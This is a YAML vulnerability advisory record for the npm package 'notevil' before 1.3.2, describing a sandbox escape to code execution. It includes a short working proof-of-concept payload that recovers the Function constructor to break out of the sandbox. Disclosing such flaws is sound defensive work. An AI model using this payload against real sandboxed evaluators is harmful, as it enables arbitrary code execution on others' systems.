---
- id: npmjs:npm:notevil:1093
  title: Sandbox Breakout / Arbitrary Code Execution
  description: "Versions of `notevil` prior to 1.3.2 are vulnerable to Sandbox Escape
    leading to Remote Code Execution. The package fails to prevent access to the `Function`
    constructor by not checking the return values of function calls. This allows attackers
    to access the Function prototype's constructor leading to the Sandbox Escape.
    An example payload is:  \n```\nvar safeEval = require('notevil')\nvar input =
    \"\" + \n\"function fn() {};\" + \n\"var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;\"
    + \n\"var properties = Object.values(constructorProperty);\" + \n\"properties.pop();\"
    + \n\"properties.pop();\" + \n\"properties.pop();\" + \n\"var Function = properties.pop();\"
    + \n\"(Function('return this'))()\"; \nsafeEval(input)```"
  affected_package: notevil
  vulnerable_versions:
  - "<1.3.2"
  severity: high
  package_manager: npm
  cwe: CWE-693
  disclosed_date: 1970-01-01
  created_date: 1970-01-01
  last_modified_date: 1970-01-01
  credit: Alan S Wang
  references: https://npmjs.com/advisories/1093
  source_url: https://npmjs.com/advisories/1093
